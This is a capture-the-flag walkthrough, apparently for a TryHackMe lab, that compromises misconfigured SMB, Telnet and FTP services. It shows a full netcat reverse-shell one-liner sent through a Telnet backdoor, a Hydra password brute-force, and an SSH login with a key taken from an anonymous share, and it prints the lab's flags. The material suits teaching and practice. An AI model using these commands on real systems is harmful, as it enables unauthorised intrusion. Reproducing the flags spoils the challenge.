# Write-up
Overview
This room is about three services that are older than most people reading this: SMB, Telnet, and FTP. The goal is simple — find what's misconfigured, exploit it, and grab the flags. Spoiler: everything is misconfigured.

Enumeration
I started the way I always do — throw an Nmap scan at it and see what comes back.
bashnmap -T4 -p- -sV -sC -Pn <TARGET_IP>
The important flag here is -p-. Without it, you scan the top 1000 ports and completely miss the Telnet service hiding on port 8012. I almost made that mistake. Always scan everything.
What came back: SSH on 22, SMB on 139 and 445 running Samba 4.7.6, something unknown on port 8012, and FTP on 21 running vsftpd 3.0.3.
With SMB showing up I ran enum4linux to dig a bit deeper:
bashenum4linux -a <TARGET_IP>
This gave me the machine name POLOSMB, confirmed it was Linux, and more importantly — revealed a share called profiles. That's the one we want.

Foothold — SMB
I tried connecting to the profiles share with no credentials. Just to see what happens.
bashsmbclient //<TARGET_IP>/profiles -U anonymous
Hit enter when it asked for a password. It let me straight in.
I started browsing around and found a directory called cactus. Inside it there was a .ssh folder and inside that — an id_rsa file. A private SSH key. Sitting in an anonymous share with no password. I actually had to re-read the directory listing twice because I didn't believe it.
bashsmb: \cactus\.ssh\> get id_rsa
smb: \cactus\.ssh\> get id_rsa.pub
The public key had cactus@polosmb at the end so now I have both the key and the username. I'll use this later. For now, let's keep looking around.

Foothold — Telnet
Connected to port 8012 and got this:
SKIDY'S BACKDOOR. Type .HELP to view commands
So that's what port 8012 is. A backdoor. Before I started sending commands I wanted to confirm I actually had remote code execution and wasn't just talking to a broken service. I set up a tcpdump listener on my machine:
bashtcpdump -i tun0 icmp
Then from the Telnet session I ran:
bash.RUN ping <MY_IP> -c 1
The ping showed up on my tcpdump. RCE confirmed.
Now for the actual shell. I generated a reverse shell payload with msfvenom:
bashmsfvenom -p cmd/unix/reverse_netcat lhost=<MY_IP> lport=4444 R
Started my netcat listener:
bashnc -lvp 4444
And fired the payload through the backdoor:
bash.RUN mkfifo /tmp/wqivu; nc <MY_IP> 4444 0</tmp/wqivu | /bin/sh >/tmp/wqivu 2>&1; rm /tmp/wqivu
Shell came back. Typed whoami and got root. Found flag.txt in the current directory and grabbed it.

🏴 THM{y0u_g0t_th3_t3ln3t_fl4g}


Foothold — FTP
Anonymous FTP login worked without any surprise at this point:
bashftp <TARGET_IP>
Username anonymous, blank password. Inside there was a single file called PUBLIC_NOTICE.txt. I downloaded it and read it.
It was an internal message from someone named Emily, asking a colleague to tell Mike that the FTP server wasn't working and could he please check it. So now I have a username — mike — handed to me in a text file on an anonymously accessible FTP server.
I ran Hydra against it:
bashhydra -t 4 -l mike -P /usr/share/wordlists/rockyou.txt -vV <TARGET_IP> ftp
Password came back as password. I logged back in as Mike, grabbed ftp.txt, and that was the third flag done.

Privilege Escalation / SSH Access
Back to that id_rsa file from the SMB share. Before using it, fix the permissions — SSH will refuse the key if they're too open:
bashchmod 600 id_rsa
Then log in:
bashssh -i id_rsa cactus@<TARGET_IP>
Landed as cactus. The SMB flag was sitting right in the home directory inside smb.txt.

🏴 THM{smb_is_fun_eh?}


Flags

SMB → THM{smb_is_fun_eh?} — found in smb.txt after SSH as cactus
Telnet → THM{y0u_g0t_th3_t3ln3t_fl4g} — found in flag.txt after reverse shell
FTP → found in ftp.txt after logging in as mike
 
